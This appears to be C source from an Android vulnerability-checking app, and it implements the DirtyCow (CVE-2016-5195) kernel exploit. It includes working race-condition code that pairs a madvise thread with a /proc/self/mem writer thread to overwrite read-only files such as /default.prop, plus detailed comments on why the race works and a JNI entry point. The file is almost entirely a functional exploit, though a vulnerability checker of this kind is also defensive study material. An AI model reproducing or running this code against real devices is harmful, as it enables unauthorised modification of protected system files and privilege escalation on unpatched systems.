#include <err.h>
#include <stdio.h>
#include <fcntl.h>
#include <pthread.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <jni.h>

#ifdef DEBUG
#include <android/log.h>
#define LOGV(...) { __android_log_print(ANDROID_LOG_INFO, "exploit", __VA_ARGS__); printf(__VA_ARGS__); printf("\n"); fflush(stdout); }
#else
#define LOGV(...)
#endif

#define LOOP   0x100000
#define STRINGSIZE 200

#ifndef PAGE_SIZE
#define PAGE_SIZE 4096
#endif

struct mem_arg  {
	unsigned char *offset;
	unsigned char *patch;
	unsigned char *unpatch;
	size_t patch_size;
	int do_patch;
};

// enum defining the Error codes for JNI
typedef enum EerrorCode{
    success = 0,
    cantOpenFile,
    cantMap,
    wrongParamater
} errorCode;


static void *madviseThread(void *arg)		// thread runnable function, getting a
											// 'mem_arg' element (needs to ve void type
											// for thread call)
{
	struct mem_arg *mem_arg;
	size_t size;
	void *addr;
	int i, c = 0;

	mem_arg = (struct mem_arg *)arg;
	/*addr = (void *)((off_t)mem_arg->offset & (~(PAGE_SIZE - 1)));*/
	/*size = mem_arg->offset - (unsigned long)addr;*/
	/*size = mem_arg->patch_size + (mem_arg->offset - addr);*/
	size = mem_arg->patch_size;
	addr = (void *)(mem_arg->offset);

	LOGV("[*] madvise = %p %d", addr, size);

	for(i = 0; i < LOOP; i++) {
		c += madvise(addr, size, MADV_DONTNEED);        // give advice about use of memory
        // This call is the main cause for the DirtyCow exploit to work properly.
        // 'madvise' gives the kernel advise/directions on how the mapped memory at 'addr + size' is going
        // to be used in the future. Hence the kernel can decide on how to handle the memory page when remapping
        // is mandatory.
        // ( -> helpful for proper resource management invoked by the programmer. For example the
		// programmer may inform the kernel that there will only be sequential access to the memory,
		// therefore the kernel can swap out the page right after it has been used, because it won't
        // be used again until the next program sequence.)
        // For DirtyCow, the kernel is told that the program won't need the the memory at 'addr',
        // therefore the Kernel is advised 'just throw it away'.
        // When the exploit is used, the memory map at 'addr' holds the file that shall be
        // overwritten. The Madvise thread tells the Kernel to throw away the memory at the address
        // of our file, even if it is dirty (has been changed). Therefore any changes to the memory
        // wont be propagated to the underlining file. The procselfMemThread however, is constantly
        // trying to write to the memory at this address.
        // From the man page of this function, about the DONTNEED flag:
        // "[...] subsequent accesses of pages in the range will succeed, but will result in [...]
        // repopulating the memory contents from the up-to-date contents of the underlying mapped file [...]"
        // -> The file will be reloaded on next access.
	}

	LOGV("[*] madvise = %d %d", c, i);
	return 0;
}

static void *procselfmemThread(void *arg)
{
	struct mem_arg *mem_arg;
	int fd, i, c = 0;
	unsigned char *p;

	mem_arg = (struct mem_arg *)arg;
	p = mem_arg->do_patch ? mem_arg->patch : mem_arg->unpatch;

	fd = open("/proc/self/mem", O_RDWR);
	if (fd == -1)
		LOGV("open(\"/proc/self/mem\"");

    // The thread opens the 'file' representing the memory page of the process and tries to write
    // to the address of the memory mapped file the exploit tries to overwrite. Since the file got
    // mapped with the private flag, the Kernel will use COW and therefore create a copy of the
    // memory segment on write access. This system call takes time to execute, since a copy of the
    // memory is created. After the copy is created the thread is free to write to the memory, which
    // then points to a copy of the real file. There is a race condition, however, which allows the
    // thread to write to the address before a copy has been created by the kernel. At this point,
    // the program is able to write to the 'real' file instead of writing to the copy. Therefore
    // the original file is changed.
	for (i = 0; i < LOOP; i++) {
        lseek(fd, (off_t) mem_arg->offset, SEEK_SET);
        // int  write(  int  handle,  void  *buffer,  int  nbyte  );
        // write 'nbytes' of buffer into handle (file)
        c += write(fd, p, mem_arg->patch_size);
    }

	LOGV("[*] /proc/self/mem %d %i", c, i);

	close(fd);

	return NULL;
}

static void exploit(struct mem_arg *mem_arg, int do_patch)
{
	pthread_t pth1, pth2;

	LOGV("[*] exploit (%s)", do_patch ? "patch": "unpatch");
	LOGV("[*] currently %p=%lx", (void*)mem_arg->offset, *(unsigned long*)mem_arg->offset);

	mem_arg->do_patch = do_patch;

	pthread_create(&pth1, NULL, madviseThread, mem_arg);
	pthread_create(&pth2, NULL, procselfmemThread, mem_arg);

	pthread_join(pth1, NULL);
	pthread_join(pth2, NULL);

	LOGV("[*] exploited %p=%lx", (void*)mem_arg->offset, *(unsigned long*)mem_arg->offset);
}

errorCode callCow(int argc, const char *argv[])
{
	// check
	if (argc < 2/* && arg > 2 */) {
		LOGV("usage %s /default.prop /data/local/tmp/default.prop", argv[0]);
		return wrongParamater;
	}

	struct mem_arg mem_arg;
	struct stat st_oldFile;						// file structure used by fstat function (file status)
	struct stat st_newFile;

	// check read access to files that should be used
	int oldFile=open(argv[0],O_RDONLY);
	if (oldFile == -1) {
		LOGV("could not open %s", argv[0]);
		return cantOpenFile;
	}
	// get information about file 'oldFile', to check its size against 'newFile'
	// Prototype: int fstat(int fd, struct stat *buf);
	if (fstat(oldFile,&st_oldFile) == -1) {
		LOGV("could not open %s", argv[0]);
		return cantOpenFile;
	}

	int newFile=open(argv[1],O_RDONLY);
	if (newFile == -1) {
		LOGV("could not open %s", argv[1]);
		return cantOpenFile;
	}
	if (fstat(newFile,&st_newFile) == -1) {
		LOGV("could not open %s", argv[1]);
		return cantOpenFile;
	}

	// check file sizes match -> DirtyCow has a space limit, where the new file
	// may not be larger than the original file that shall be exploited.
	size_t size = st_oldFile.st_size;
	if (st_newFile.st_size != st_oldFile.st_size) {
		LOGV("warning: new file size (%lld) and file old size (%lld) differ\n", st_newFile.st_size, st_oldFile.st_size);
		if (st_newFile.st_size > size) {
			size = st_newFile.st_size;
		}
	}

	LOGV("size %d\n\n",size);		// Log file size of old file

	mem_arg.patch = malloc(size);
	if (mem_arg.patch == NULL)
		LOGV("malloc");

	memset(mem_arg.patch, 0, size);

	mem_arg.unpatch = malloc(size);
	if (mem_arg.unpatch == NULL)
		LOGV("malloc");

	read(newFile, mem_arg.patch, st_newFile.st_size);		// read 'newFile' into the 'patch' buffer
	close(newFile);											// close 'newFile'

	/*read(oldFile, mem_arg.unpatch, st_oldFile.st_size);*/

	mem_arg.patch_size = size;
	mem_arg.do_patch = 1;

    // map the 'oldFile' into a private RAM (memory) sector as read only (PROT_READ)
    // This maps a file from disk directly into the memory, it does not create a 'copy' of the file.
    // MAP_PRIVATE (use copy on write on changes)
    // Create a private copy-on-write mapping.  Updates to the
    // mapping are not visible to other processes mapping the same
    // file, and are not carried through to the underlying file.  It
    // is unspecified whether changes made to the file after the
    // mmap() call are visible in the mapped region.
    void * map = mmap(NULL, size, PROT_READ, MAP_PRIVATE, oldFile, 0);
	if (map == MAP_FAILED) {
		LOGV("mmap");
		return cantMap;
	}

	LOGV("[*] mmap %p", map);

	mem_arg.offset = map;

	exploit(&mem_arg, 1);

	close(oldFile);
	// to put back
	/*exploit(&mem_arg, 0);*/

	return success;
}

JNIEXPORT jint JNICALL
Java_fuzion24_device_vulnerability_vulnerabilities_kernel_CVE_12016_15195_runDirtyCow(JNIEnv *env, jobject obj, jobjectArray stringArray){
    int stringCount = (*env)->GetArrayLength(env, stringArray);
    char src[STRINGSIZE];
    char dest[STRINGSIZE];
	const char *argv[2];
    jstring string[2];
    argv[0] = dest;
    argv[1] = src;
    errorCode error;
    for (int i=0; i < stringCount; i++)
    {
        string[i] = (*env)->GetObjectArrayElement(env, stringArray, i);
        argv[i] = (*env)->GetStringUTFChars(env, string[i], 0);
    }
    error = callCow(stringCount, argv);
    for (int i = 0; i < stringCount; i++) {
        (*env)->ReleaseStringUTFChars(env, string[i], argv[i]);
        (*env)->DeleteLocalRef(env, string[i]);
    }
    return (jint)error;
}
